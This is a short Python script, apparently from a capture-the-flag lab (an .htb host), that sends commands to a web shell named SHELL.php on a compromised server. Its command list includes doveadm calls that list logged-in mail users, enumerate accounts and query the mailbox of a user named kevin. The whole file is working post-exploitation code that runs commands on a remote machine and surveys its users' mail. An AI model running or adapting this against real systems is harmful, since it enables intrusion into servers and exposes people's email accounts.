import urllib.request, urllib.parse

url = "http://10.129.26.34/files/SHELL.php?" + urllib.parse.urlencode({"c": "export PATH=/usr/bin:/usr/sbin; /usr/bin/doveadm who 2>&1; echo '---'; /usr/bin/doveadm user '*' 2>&1 | head -10; echo '---'; /usr/bin/doveadm mailbox status -u kevin all INBOX 2>&1; echo DONE"})
headers = {"Host": "support_001.enigma.htb"}
req = urllib.request.Request(url, headers=headers)
try:
    resp = urllib.request.urlopen(req, timeout=10)
    result = resp.read().decode("utf-8", errors="replace").strip()
    print(result[:2000])
except Exception as e:
    print(f"Error: {e}")
